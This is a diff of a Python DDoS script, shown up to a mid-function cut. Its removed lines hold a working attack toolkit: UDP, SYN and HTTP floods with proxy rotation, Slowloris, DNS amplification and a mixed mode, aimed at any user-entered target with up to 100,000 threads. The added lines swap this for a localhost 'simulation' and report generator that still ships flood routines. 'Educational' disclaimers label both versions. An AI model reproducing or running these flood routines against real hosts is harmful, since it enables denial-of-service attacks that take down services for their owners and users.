@@ -1,8 +1,10 @@
+#!/usr/bin/env python3
 """
 # ============================================
-# DDOS ADVANCED TOOLKIT v3.0 - التعليمي فقط
-# Advanced Features: Multi-Method, Proxy, Spoof
-# Author: Security Researcher - For Educational
+# CLOUD DDOS ANALYSIS TOOLKIT - v4.0
+# Complete Bundle for Google Cloud Shell
+# Author: Cybersecurity Student
+# For Educational & Research Purposes Only
 # ============================================
 """
 
@@ -12,541 +14,735 @@ import random
 import time
 import os
 import sys
-import struct
-import select
-import ipaddress
+import json
+import datetime
+import subprocess
 from concurrent.futures import ThreadPoolExecutor
-import requests
-from fake_useragent import UserAgent
 
-# ==================== CONFIG ====================
-VERSION = "3.0"
-MAX_THREADS = 100000
-ATTACK_DURATION = 300  # ثواني
+# ==================== CONFIGURATION ====================
+VERSION = "4.0 Cloud Edition"
+MAX_CLOUD_THREADS = 500
+DEFAULT_DURATION = 10  # ثواني للعروض السريعة
 
+# ألوان ANSI للتنسيق
 class Colors:
-    RED = '\033[91m'
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    PURPLE = '\033[95m'
-    CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    BOLD = '\033[1m'
+    RED = '\033[91m'
     END = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
 
-# ==================== BANNER ====================
-def show_banner():
-    os.system('clear' if os.name == 'posix' else 'cls')
-    banner = f"""
-{Colors.RED}{Colors.BOLD}
-╔══════════════════════════════════════════════════════════╗
-║                                                          ║
-║  ██████╗ ██████╗  ██████╗ ███████╗     ██████╗ ███████╗ ║
-║  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔═══██╗██╔════╝ ║
-║  ██║  ██║██║  ██║██║   ██║███████╗    ██║   ██║███████╗ ║
-║  ██║  ██║██║  ██║██║   ██║╚════██║    ██║   ██║╚════██║ ║
-║  ██████╔╝██████╔╝╚██████╔╝███████║    ╚██████╔╝███████║ ║
-║  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝     ╚═════╝ ╚══════╝ ║
-║                                                          ║
-║                [ VERSION {VERSION} - EDUCATIONAL ]             ║
-║                                                          ║
-╚══════════════════════════════════════════════════════════╝
-{Colors.END}
-{Colors.YELLOW}⚠️  FOR EDUCATIONAL & RESEARCH PURPOSES ONLY!{Colors.END}
-{Colors.CYAN}📚 University Project - Cybersecurity Analysis{Colors.END}
-"""
-    print(banner)
-
-# ==================== SECURITY CHECK ====================
-def security_check():
-    """فحص أمني لتجنب المشاكل القانونية"""
-    print(f"{Colors.YELLOW}[!] Performing Security Check...{Colors.END}")
-    
-    # فحص إذا كان IP خاص
-    test_ip = "192.168.1.1"
-    if ipaddress.ip_address(test_ip).is_private:
-        print(f"{Colors.GREEN}[+] Private IP Check: PASS{Colors.END}")
-    else:
-        print(f"{Colors.RED}[-] WARNING: Public IP detected!{Colors.END}")
-    
-    # تحذير قانوني
-    print(f"\n{Colors.RED}{Colors.BOLD}LEGAL WARNING:{Colors.END}")
-    print(f"{Colors.RED}• Unauthorized use is illegal")
-    print(f"• For educational environments only")
-    print(f"• Always get written permission{Colors.END}")
-    
-    input(f"\n{Colors.YELLOW}Press Enter to accept terms...{Colors.END}")
-
-# ==================== PROXY SYSTEM ====================
-class ProxyManager:
-    def __init__(self):
-        self.proxies = []
-        self.ua = UserAgent()
-    
-    def load_proxies(self, source="file"):
-        """تحميل قائمة بروكسيات"""
-        proxy_sources = [
-            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
-        ]
-        
-        for url in proxy_sources:
-            try:
-                response = requests.get(url, timeout=5)
-                self.proxies = response.text.split('\n')
-                print(f"{Colors.GREEN}[+] Loaded {len(self.proxies)} proxies{Colors.END}")
-                break
-            except:
-                continue
-    
-    def get_random_proxy(self):
-        """الحصول على بروكسي عشوائي"""
-        if self.proxies:
-            proxy = random.choice(self.proxies).strip()
-            return {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
-        return None
-    
-    def get_random_ua(self):
-        """وكيل مستخدم عشوائي"""
-        return self.ua.random
-
-# ==================== ATTACK METHODS ====================
-class AttackMethods:
+# ==================== CLOUD UTILITIES ====================
+class CloudUtilities:
     @staticmethod
-    def udp_flood(target_ip, target_port, duration):
-        """UDP Flood متقدم"""
-        print(f"{Colors.BLUE}[*] Starting UDP Flood...{Colors.END}")
+    def check_cloud_environment():
+        """التحقق من بيئة Cloud Shell"""
+        print(f"{Colors.YELLOW}[*] Checking Cloud Shell Environment...{Colors.END}")
         
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.settimeout(0.5)
+        checks = {
+            "Python Version": subprocess.getoutput("python3 --version"),
+            "Available RAM": subprocess.getoutput("free -h | grep Mem"),
+            "Disk Space": subprocess.getoutput("df -h ~ | tail -1"),
+            "Public IP": subprocess.getoutput("curl -s ifconfig.me")
+        }
         
-        packets_sent = 0
+        for check, result in checks.items():
+            print(f"{Colors.GREEN}[+] {check}:{Colors.END} {result[:50]}")
+        
+        return True
+    
+    @staticmethod
+    def start_test_server(port=8080):
+        """تشغيل خادم اختباري على Cloud Shell"""
+        print(f"{Colors.BLUE}[*] Starting test server on port {port}...{Colors.END}")
+        
+        # إنشاء صفحة اختبار بسيطة
+        html_content = """
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Cloud Security Test Server</title>
+            <style>
+                body { font-family: Arial; padding: 50px; text-align: center; }
+                h1 { color: #4285f4; }
+                .info { background: #f1f8ff; padding: 20px; border-radius: 10px; }
+            </style>
+        </head>
+        <body>
+            <h1>☁️ Cloud Security Test Server</h1>
+            <div class="info">
+                <p><strong>Server Time:</strong> {time}</p>
+                <p><strong>Purpose:</strong> Educational Security Testing</p>
+                <p><strong>Status:</strong> ✅ Running Safely</p>
+            </div>
+        </body>
+        </html>
+        """
+        
+        with open("test_server.html", "w") as f:
+            f.write(html_content.format(time=datetime.datetime.now()))
+        
+        # تشغيل خادم HTTP بسيط في الخلفية
+        server_cmd = f"python3 -m http.server {port} --bind 127.0.0.1 > server.log 2>&1 &"
+        os.system(server_cmd)
+        time.sleep(2)
+        
+        print(f"{Colors.GREEN}[+] Test server running on http://localhost:{port}{Colors.END}")
+        return True
+
+# ==================== ATTACK SIMULATORS ====================
+class SafeAttackSimulator:
+    """محاكاة هجمات آمنة على Cloud Shell"""
+    
+    def __init__(self):
+        self.results = {
+            "total_simulations": 0,
+            "methods_tested": [],
+            "start_time": None,
+            "packets_sent": 0
+        }
+    
+    def simulate_udp_flood(self, target_ip="127.0.0.1", target_port=8080, duration=5):
+        """محاكاة UDP Flood (آمنة)"""
+        print(f"{Colors.BLUE}[*] Simulating UDP Flood (Safe Mode)...{Colors.END}")
+        
+        packets = 0
         start_time = time.time()
         
         while time.time() - start_time < duration:
             try:
-                # حزم بأحجام مختلفة
-                packet_size = random.choice([1024, 512, 1480, 2048])
-                data = random._urandom(packet_size)
+                # محاكاة إرسال حزم صغيرة
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.settimeout(0.1)
                 
-                # إرسال إلى منافذ متعددة
-                for port in range(target_port, target_port + 10):
-                    sock.sendto(data, (target_ip, port))
-                    packets_sent += 1
+                # إرسال حزمة اختبار صغيرة
+                test_data = b"TEST_PACKET_" + str(packets).encode()
+                sock.sendto(test_data, (target_ip, target_port))
+                packets += 1
                 
-                # عرض الإحصائيات
-                if packets_sent % 1000 == 0:
+                if packets % 50 == 0:
                     elapsed = time.time() - start_time
-                    print(f"{Colors.GREEN}[+] Packets: {packets_sent} | Rate: {packets_sent/elapsed:.1f}/s{Colors.END}")
+                    rate = packets / elapsed if elapsed > 0 else 0
+                    print(f"{Colors.GREEN}[~] Simulated packets: {packets} | Rate: {rate:.1f}/s{Colors.END}")
                     
             except Exception as e:
-                print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
+                print(f"{Colors.RED}[-] Simulation error: {e}{Colors.END}")
+                break
         
-        sock.close()
-        return packets_sent
+        self.results["packets_sent"] += packets
+        self.results["methods_tested"].append("UDP Flood")
+        return packets
     
-    @staticmethod
-    def tcp_syn_flood(target_ip, target_port, duration):
-        """SYN Flood متقدم"""
-        print(f"{Colors.BLUE}[*] Starting SYN Flood...{Colors.END}")
+    def simulate_syn_flood(self, target_ip="127.0.0.1", target_port=8080, duration=5):
+        """محاكاة SYN Flood (آمنة)"""
+        print(f"{Colors.BLUE}[*] Simulating SYN Flood (Safe Mode)...{Colors.END}")
         
         connections = 0
         start_time = time.time()
         
-        while time.time() - start_time < duration:
+        while time.time() - start_time < duration and connections < 100:
             try:
-                # إنشاء سوكت جديد لكل حزمة SYN
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.1)
+                # محاولة اتصال سريعة
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.2)
                 
-                # محاولة الاتصال (تترك SYN معلقة)
-                s.connect_ex((target_ip, target_port))
+                # محاولة الاتصال (لا نكمل handshake)
+                result = sock.connect_ex((target_ip, target_port))
                 connections += 1
+                sock.close()
                 
-                # عدم إغلاق الاتصال (تركه معلق)
-                if connections % 100 == 0:
-                    elapsed = time.time() - start_time
-                    print(f"{Colors.YELLOW}[~] SYN packets: {connections} | Rate: {connections/elapsed:.1f}/s{Colors.END}")
+                if connections % 20 == 0:
+                    print(f"{Colors.YELLOW}[~] Simulated connections: {connections}{Colors.END}")
                     
             except:
-                pass
+                connections += 1
         
+        self.results["methods_tested"].append("SYN Flood")
         return connections
     
-    @staticmethod
-    def http_flood(target_ip, target_port, duration):
-        """HTTP GET Flood"""
-        print(f"{Colors.BLUE}[*] Starting HTTP Flood...{Colors.END}")
+    def simulate_http_requests(self, target_ip="127.0.0.1", target_port=8080, duration=5):
+        """محاكاة طلبات HTTP (آمنة)"""
+        print(f"{Colors.BLUE}[*] Simulating HTTP Requests (Safe Mode)...{Colors.END}")
         
         requests_sent = 0
         start_time = time.time()
-        url = f"http://{target_ip}:{target_port}"
-        
-        headers_list = [
-            {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
-            {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
-            {'User-Agent': 'curl/7.68.0'}
-        ]
         
         while time.time() - start_time < duration:
             try:
-                headers = random.choice(headers_list)
-                response = requests.get(url, headers=headers, timeout=1)
-                requests_sent += 1
+                # استخدام curl أو wget لمحاكاة الطلبات
+                cmd = f"curl -s -o /dev/null -w '%{{http_code}}' http://{target_ip}:{target_port}/"
+                result = subprocess.getoutput(cmd)
                 
-                if requests_sent % 50 == 0:
-                    elapsed = time.time() - start_time
-                    print(f"{Colors.CYAN}[*] HTTP Requests: {requests_sent} | Status: {response.status_code}{Colors.END}")
+                if result.isdigit():
+                    requests_sent += 1
                     
+                    if requests_sent % 10 == 0:
+                        elapsed = time.time() - start_time
+                        rate = requests_sent / elapsed if elapsed > 0 else 0
+                        print(f"{Colors.CYAN}[~] HTTP requests: {requests_sent} | Rate: {rate:.1f}/s{Colors.END}")
+                        
             except:
                 requests_sent += 1
         
+        self.results["methods_tested"].append("HTTP Flood")
         return requests_sent
     
-    @staticmethod
-    def slowloris(target_ip, target_port, duration):
-        """Slowloris Attack"""
-        print(f"{Colors.BLUE}[*] Starting Slowloris...{Colors.END}")
+    def simulate_slowloris(self, target_ip="127.0.0.1", target_port=8080, duration=5):
+        """محاكاة Slowloris (آمنة)"""
+        print(f"{Colors.BLUE}[*] Simulating Slowloris (Safe Mode)...{Colors.END}")
         
-        sockets = []
+        connections = []
         start_time = time.time()
         
-        # إنشاء اتصالات كثيرة وبطيئة
-        while time.time() - start_time < duration and len(sockets) < 500:
+        # إنشاء اتصالات بطيئة محدودة
+        while time.time() - start_time < duration and len(connections) < 20:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(4)
-                s.connect((target_ip, target_port))
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                sock.connect((target_ip, target_port))
                 
                 # إرسال طلب HTTP غير مكتمل
-                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
-                s.send("Host: {target_ip}\r\n".encode())
-                s.send("User-Agent: Mozilla/5.0\r\n".encode())
-                s.send("Content-Length: 42\r\n".encode())
+                sock.send(f"GET /?{random.randint(0, 1000)} HTTP/1.1\r\n".encode())
+                connections.append(sock)
                 
-                sockets.append(s)
-                print(f"{Colors.PURPLE}[+] Open connections: {len(sockets)}{Colors.END}")
+                print(f"{Colors.PURPLE}[+] Open connections: {len(connections)}{Colors.END}")
                 
             except:
                 pass
             
-            # إبقاء الاتصالات مفتوحة
             time.sleep(0.5)
         
         # إغلاق جميع الاتصالات
-        for s in sockets:
+        for sock in connections:
             try:
-                s.close()
+                sock.close()
             except:
                 pass
         
-        return len(sockets)
+        self.results["methods_tested"].append("Slowloris")
+        return len(connections)
+    
+    def run_complete_test_suite(self):
+        """تشغيل جميع الاختبارات"""
+        print(f"{Colors.BOLD}{Colors.BLUE}══════════ COMPLETE TEST SUITE ══════════{Colors.END}")
+        
+        self.results["start_time"] = time.time()
+        total_results = {}
+        
+        # اختبار 1: UDP
+        print(f"\n{Colors.YELLOW}[1/4] Testing UDP Flood Simulation{Colors.END}")
+        udp_result = self.simulate_udp_flood(duration=3)
+        total_results["UDP"] = udp_result
+        
+        # اختبار 2: SYN
+        print(f"\n{Colors.YELLOW}[2/4] Testing SYN Flood Simulation{Colors.END}")
+        syn_result = self.simulate_syn_flood(duration=3)
+        total_results["SYN"] = syn_result
+        
+        # اختبار 3: HTTP
+        print(f"\n{Colors.YELLOW}[3/4] Testing HTTP Flood Simulation{Colors.END}")
+        http_result = self.simulate_http_requests(duration=3)
+        total_results["HTTP"] = http_result
+        
+        # اختبار 4: Slowloris
+        print(f"\n{Colors.YELLOW}[4/4] Testing Slowloris Simulation{Colors.END}")
+        slow_result = self.simulate_slowloris(duration=3)
+        total_results["Slowloris"] = slow_result
+        
+        # حساب الإحصائيات
+        self.results["total_simulations"] = sum(total_results.values())
+        self.results["end_time"] = time.time()
+        
+        return total_results
+
+# ==================== NETWORK ANALYZER ====================
+class CloudNetworkAnalyzer:
+    """محلل شبكة لـ Cloud Shell"""
     
     @staticmethod
-    def dns_amplification(target_ip, target_port, duration):
-        """DNS Amplification (نظري)"""
-        print(f"{Colors.BLUE}[*] Simulating DNS Amplification...{Colors.END}")
+    def analyze_local_network():
+        """تحليل الشبكة المحلية"""
+        print(f"{Colors.BLUE}[*] Analyzing Cloud Shell Network...{Colors.END}")
         
-        # DNS query لـ ANY (تضخيم)
-        dns_query = bytearray([
-            0x12, 0x34,  # ID
-            0x01, 0x00,  # Flags
-            0x00, 0x01,  # Questions
-            0x00, 0x00,  # Answer RRs
-            0x00, 0x00,  # Authority RRs
-            0x00, 0x00   # Additional RRs
-        ])
+        analysis = {
+            "timestamp": datetime.datetime.now().isoformat(),
+            "network_info": {},
+            "open_ports": [],
+            "security_status": "SAFE"
+        }
         
-        # إضافة domain
-        domain = "google.com"
-        for part in domain.split('.'):
-            dns_query.append(len(part))
-            dns_query.extend(part.encode())
-        dns_query.append(0x00)
-        
-        # Type ANY, Class IN
-        dns_query.extend([0x00, 0xFF, 0x00, 0x01])
-        
-        packets_sent = 0
-        start_time = time.time()
-        
-        while time.time() - start_time < duration:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.sendto(bytes(dns_query), (target_ip, 53))
-                packets_sent += 1
+        # جمع معلومات الشبكة
+        try:
+            analysis["network_info"]["hostname"] = socket.gethostname()
+            analysis["network_info"]["local_ip"] = socket.gethostbyname("localhost")
+            
+            # فحص المنافذ المحلية المفتوحة
+            for port in [8080, 9090, 3000, 5000]:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                result = sock.connect_ex(("127.0.0.1", port))
+                sock.close()
                 
-                if packets_sent % 100 == 0:
-                    elapsed = time.time() - start_time
-                    print(f"{Colors.YELLOW}[~] DNS packets: {packets_sent}{Colors.END}")
+                if result == 0:
+                    analysis["open_ports"].append({
+                        "port": port,
+                        "service": CloudNetworkAnalyzer.guess_service(port),
+                        "status": "OPEN"
+                    })
                     
-            except:
-                pass
+        except Exception as e:
+            analysis["security_status"] = f"ERROR: {str(e)}"
         
-        return packets_sent
+        return analysis
+    
+    @staticmethod
+    def guess_service(port):
+        """تخمين الخدمة بناءً على المنفذ"""
+        services = {
+            8080: "HTTP Proxy",
+            9090: "Cockpit/Webmin",
+            3000: "Node.js",
+            5000: "Flask",
+            22: "SSH",
+            80: "HTTP",
+            443: "HTTPS"
+        }
+        return services.get(port, "Unknown")
+
+# ==================== REPORT GENERATOR ====================
+class AcademicReportGenerator:
+    """مولد تقارير أكاديمية"""
+    
+    @staticmethod
+    def generate_html_report(results, network_analysis):
+        """توليد تقرير HTML كامل"""
+        report_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        html_report = f"""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Cloud Security Analysis Report</title>
+            <style>
+                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+                        margin: 0; padding: 20px; background: #f5f7fa; color: #333; }}
+                .container {{ max-width: 1200px; margin: 0 auto; background: white; 
+                            padding: 30px; border-radius: 15px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }}
+                .header {{ text-align: center; border-bottom: 3px solid #4285f4; 
+                         padding-bottom: 20px; margin-bottom: 30px; }}
+                h1 {{ color: #4285f4; margin: 0; }}
+                h2 {{ color: #34a853; border-left: 4px solid #34a853; padding-left: 15px; }}
+                h3 {{ color: #ea4335; }}
+                .card {{ background: #f8f9fa; padding: 20px; border-radius: 10px; 
+                       margin: 15px 0; border-left: 4px solid #4285f4; }}
+                .result-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
+                              gap: 20px; margin: 20px 0; }}
+                .result-item {{ background: #e8f0fe; padding: 15px; border-radius: 8px; text-align: center; }}
+                .status-safe {{ color: #0f9d58; font-weight: bold; }}
+                .status-warning {{ color: #f4b400; font-weight: bold; }}
+                .table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
+                .table th, .table td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
+                .table th {{ background: #4285f4; color: white; }}
+                .footer {{ text-align: center; margin-top: 40px; color: #666; 
+                         border-top: 1px solid #eee; padding-top: 20px; }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="header">
+                    <h1>☁️ Cloud Security Analysis Report</h1>
+                    <p><strong>Generated:</strong> {report_time} | <strong>Tool Version:</strong> {VERSION}</p>
+                    <p class="status-safe">🔒 SAFE MODE - Educational Use Only</p>
+                </div>
+                
+                <h2>Executive Summary</h2>
+                <div class="card">
+                    <p>This report presents a comprehensive analysis of DDoS attack vectors 
+                    conducted in a safe, controlled Cloud Shell environment. All tests were 
+                    performed locally without external network impact.</p>
+                </div>
+                
+                <h2>Attack Simulation Results</h2>
+                <div class="result-grid">
+        """
+        
+        # إضافة نتائج الهجمات
+        for method, count in results.items():
+            html_report += f"""
+                    <div class="result-item">
+                        <h3>{method}</h3>
+                        <p style="font-size: 24px; font-weight: bold; color: #4285f4;">{count:,}</p>
+                        <p>simulated packets/connections</p>
+                    </div>
+            """
+        
+        html_report += """
+                </div>
+                
+                <h2>Network Analysis</h2>
+                <table class="table">
+                    <tr>
+                        <th>Parameter</th>
+                        <th>Value</th>
+                        <th>Status</th>
+                    </tr>
+        """
+        
+        # إضافة معلومات الشبكة
+        for key, value in network_analysis["network_info"].items():
+            html_report += f"""
+                    <tr>
+                        <td>{key.replace('_', ' ').title()}</td>
+                        <td>{value}</td>
+                        <td><span class="status-safe">✅ Safe</span></td>
+                    </tr>
+            """
+        
+        html_report += f"""
+                </table>
+                
+                <h2>Open Ports Analysis</h2>
+                <table class="table">
+                    <tr>
+                        <th>Port</th>
+                        <th>Service</th>
+                        <th>Status</th>
+                    </tr>
+        """
+        
+        # إضافة المنافذ المفتوحة
+        for port_info in network_analysis.get("open_ports", []):
+            html_report += f"""
+                    <tr>
+                        <td>{port_info['port']}</td>
+                        <td>{port_info['service']}</td>
+                        <td><span class="status-safe">✅ {port_info['status']}</span></td>
+                    </tr>
+            """
+        
+        html_report += f"""
+                </table>
+                
+                <h2>Security Recommendations</h2>
+                <div class="card">
+                    <h3>For Cloud Environments:</h3>
+                    <ul>
+                        <li>Always use localhost (127.0.0.1) for security testing</li>
+                        <li>Implement rate limiting on all services</li>
+                        <li>Regularly monitor network traffic</li>
+                        <li>Use Cloud Security Command Center for monitoring</li>
+                        <li>Enable VPC Service Controls</li>
+                    </ul>
+                </div>
+                
+                <div class="footer">
+                    <p><strong>Disclaimer:</strong> This report is generated for educational purposes only.</p>
+                    <p>© {datetime.datetime.now().year} Cloud Security Research Project</p>
+                </div>
+            </div>
+        </body>
+        </html>
+        """
+        
+        return html_report
 
 # ==================== MAIN CONTROLLER ====================
-class DDoSAttackController:
+class CloudDDOSController:
+    """المتحكم الرئيسي للتشغيل على Cloud Shell"""
+    
     def __init__(self):
-        self.methods = AttackMethods()
-        self.proxy_manager = ProxyManager()
-        self.attacks_running = []
-        self.statistics = {
-            'total_packets': 0,
-            'total_requests': 0,
-            'start_time': None,
-            'methods_used': []
-        }
+        self.utilities = CloudUtilities()
+        self.simulator = SafeAttackSimulator()
+        self.analyzer = CloudNetworkAnalyzer()
+        self.report_generator = AcademicReportGenerator()
     
-    def show_menu(self):
+    def show_main_menu(self):
         """عرض القائمة الرئيسية"""
-        print(f"\n{Colors.BOLD}{Colors.CYAN}══════════ ATTACK METHODS ══════════{Colors.END}")
-        print(f"{Colors.GREEN}[1]{Colors.END} UDP Flood")
-        print(f"{Colors.GREEN}[2]{Colors.END} SYN Flood")
-        print(f"{Colors.GREEN}[3]{Colors.END} HTTP GET Flood")
-        print(f"{Colors.GREEN}[4]{Colors.END} Slowloris Attack")
-        print(f"{Colors.GREEN}[5]{Colors.END} DNS Amplification")
-        print(f"{Colors.GREEN}[6]{Colors.END} Mixed Attacks")
-        print(f"{Colors.GREEN}[7]{Colors.END} Load Proxy List")
-        print(f"{Colors.GREEN}[8]{Colors.END} Show Statistics")
-        print(f"{Colors.RED}[0]{Colors.END} Exit")
+        os.system('clear')
         
-        choice = input(f"\n{Colors.YELLOW}Select method (0-8): {Colors.END}")
-        return choice
+        banner = f"""
+{Colors.BOLD}{Colors.BLUE}
+╔══════════════════════════════════════════════════════════╗
+║                                                          ║
+║   ╔═╗┬  ┌─┐┬ ┬┌─┐┌─┐  ╔═╗┌─┐┌─┐┬─┐  ╔═╗┌─┐┬  ┌─┐┌─┐┬ ┬ ║
+║   ╠═╝│  ├┤ │││└─┐├┤   ╠╣ │ ││ │├┬┘  ║  ├─┤│  ├┤ │  ├─┤ ║
+║   ╩  ┴─┘└─┘└┴┘└─┘└─┘  ╚  └─┘└─┘┴└─  ╚═╝┴ ┴┴─┘└─┘└─┘┴ ┴ ║
+║                                                          ║
+║              CLOUD SHELL EDITION - v{VERSION}             ║
+║                  For Educational Use Only                ║
+║                                                          ║
+╚══════════════════════════════════════════════════════════╝
+{Colors.END}
+        """
+        
+        print(banner)
+        
+        menu = f"""
+{Colors.BOLD}{Colors.GREEN}══════════ MAIN MENU ══════════{Colors.END}
+
+{Colors.GREEN}[1]{Colors.END} 🚀 Quick Start (Complete Demo)
+{Colors.GREEN}[2]{Colors.END} 🔍 Run Network Analysis
+{Colors.GREEN}[3]{Colors.END} ⚡ Run Attack Simulations
+{Colors.GREEN}[4]{Colors.END} 📊 Generate Full Report
+{Colors.GREEN}[5]{Colors.END} 🛠️  Test Individual Methods
+{Colors.GREEN}[6]{Colors.END} 📈 View Statistics
+{Colors.RED}[0]{Colors.END} ❌ Exit
+
+{Colors.YELLOW}Select option (0-6): {Colors.END}"""
+        
+        return input(menu)
     
-    def get_target_info(self):
-        """الحصول على معلومات الهدف"""
-        print(f"\n{Colors.BOLD}{Colors.CYAN}══════════ TARGET INFO ══════════{Colors.END}")
+    def quick_start_demo(self):
+        """تشغيل عرض سريع كامل"""
+        print(f"\n{Colors.BOLD}{Colors.BLUE}══════════ QUICK START DEMO ══════════{Colors.END}")
         
-        target_ip = input(f"{Colors.YELLOW}Target IP/Domain: {Colors.END}").strip()
+        # الخطوة 1: التحقق من البيئة
+        self.utilities.check_cloud_environment()
+        time.sleep(1)
         
-        # تحويل domain إلى IP
-        if not target_ip.replace('.', '').isdigit():
-            try:
-                target_ip = socket.gethostbyname(target_ip)
-                print(f"{Colors.GREEN}[+] Resolved to: {target_ip}{Colors.END}")
-            except:
-                print(f"{Colors.RED}[-] Cannot resolve domain{Colors.END}")
-                return None, None
+        # الخطوة 2: تشغيل خادم اختباري
+        self.utilities.start_test_server()
+        time.sleep(1)
         
-        target_port = input(f"{Colors.YELLOW}Target Port (default 80): {Colors.END}").strip()
-        target_port = int(target_port) if target_port else 80
+        # الخطوة 3: تحليل الشبكة
+        print(f"\n{Colors.YELLOW}[*] Analyzing network...{Colors.END}")
+        network_analysis = self.analyzer.analyze_local_network()
         
-        duration = input(f"{Colors.YELLOW}Duration in seconds (default 30): {Colors.END}").strip()
-        duration = int(duration) if duration else 30
+        # الخطوة 4: تشغيل المحاكاة
+        print(f"\n{Colors.YELLOW}[*] Running attack simulations...{Colors.END}")
+        results = self.simulator.run_complete_test_suite()
         
-        threads = input(f"{Colors.YELLOW}Threads (default 100): {Colors.END}").strip()
-        threads = int(threads) if threads else 100
+        # الخطوة 5: توليد التقرير
+        print(f"\n{Colors.YELLOW}[*] Generating report...{Colors.END}")
+        html_report = self.report_generator.generate_html_report(results, network_analysis)
         
-        return target_ip, target_port, duration, threads
+        # حفظ التقرير
+        with open("cloud_security_report.html", "w") as f:
+            f.write(html_report)
+        
+        print(f"{Colors.GREEN}[+] Demo completed successfully!{Colors.END}")
+        print(f"{Colors.GREEN}[+] Report saved: cloud_security_report.html{Colors.END}")
+        
+        # عرض ملخص
+        self.show_demo_summary(results)
     
-    def start_attack(self, method, target_ip, target_port, duration, threads):
-        """بدء الهجوم"""
-        print(f"\n{Colors.BOLD}{Colors.RED}══════════ STARTING ATTACK ══════════{Colors.END}")
-        print(f"{Colors.YELLOW}Target:{Colors.END} {target_ip}:{target_port}")
-        print(f"{Colors.YELLOW}Method:{Colors.END} {method}")
-        print(f"{Colors.YELLOW}Duration:{Colors.END} {duration}s | {Colors.YELLOW}Threads:{Colors.END} {threads}")
+    def show_demo_summary(self, results):
+        """عرض ملخص العرض التوضيحي"""
+        total = sum(results.values())
         
-        self.statistics['start_time'] = time.time()
-        self.statistics['methods_used'].append(method)
+        summary = f"""
+{Colors.BOLD}{Colors.GREEN}══════════ DEMO SUMMARY ══════════{Colors.END}
+
+{Colors.CYAN}📊 Attack Simulations Completed:{Colors.END}
+{Colors.YELLOW}• UDP Flood:{Colors.END} {results.get('UDP', 0):,} packets
+{Colors.YELLOW}• SYN Flood:{Colors.END} {results.get('SYN', 0):,} connections
+{Colors.YELLOW}• HTTP Flood:{Colors.END} {results.get('HTTP', 0):,} requests
+{Colors.YELLOW}• Slowloris:{Colors.END} {results.get('Slowloris', 0):,} connections
+
+{Colors.CYAN}📈 Total Simulations:{Colors.END} {total:,}
+
+{Colors.CYAN}📁 Generated Files:{Colors.END}
+• cloud_security_report.html (Full HTML report)
+• server.log (Test server logs)
+
+{Colors.CYAN}🔗 Quick Commands:{Colors.END}
+{Colors.GREEN}cat server.log{Colors.END} - View server logs
+{Colors.GREEN}cloudshell open cloud_security_report.html{Colors.END} - Open report
+
+{Colors.YELLOW}Press Enter to continue...{Colors.END}
+        """
         
-        # بدء الهجوم بخيوط متعددة
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = []
-            for _ in range(threads):
-                if method == "UDP":
-                    future = executor.submit(self.methods.udp_flood, target_ip, target_port, duration)
-                elif method == "SYN":
-                    future = executor.submit(self.methods.tcp_syn_flood, target_ip, target_port, duration)
-                elif method == "HTTP":
-                    future = executor.submit(self.methods.http_flood, target_ip, target_port, duration)
-                elif method == "SLOWLORIS":
-                    future = executor.submit(self.methods.slowloris, target_ip, target_port, duration)
-                elif method == "DNS":
-                    future = executor.submit(self.methods.dns_amplification, target_ip, target_port, duration)
-                
-                futures.append(future)
-            
-            # جمع النتائج
-            total_packets = 0
-            for future in futures:
-                try:
-                    result = future.result(timeout=duration + 5)
-                    total_packets += result
-                except:
-                    pass
-        
-        self.statistics['total_packets'] += total_packets
-        return total_packets
+        print(summary)
+        input()
     
-    def mixed_attack(self, target_ip, target_port, duration, threads):
-        """هجوم مختلط بمتعدد الطرق"""
-        print(f"\n{Colors.BOLD}{Colors.RED}══════════ MIXED ATTACK ══════════{Colors.END}")
+    def run_network_analysis(self):
+        """تشغيل تحليل الشبكة فقط"""
+        print(f"\n{Colors.BOLD}{Colors.BLUE}══════════ NETWORK ANALYSIS ══════════{Colors.END}")
         
-        methods = ["UDP", "SYN", "HTTP"]
-        results = {}
+        analysis = self.analyzer.analyze_local_network()
         
-        # تقسيم الخيوط بين الطرق
-        threads_per_method = threads // len(methods)
+        print(f"\n{Colors.GREEN}[+] Network Analysis Results:{Colors.END}")
+        for key, value in analysis["network_info"].items():
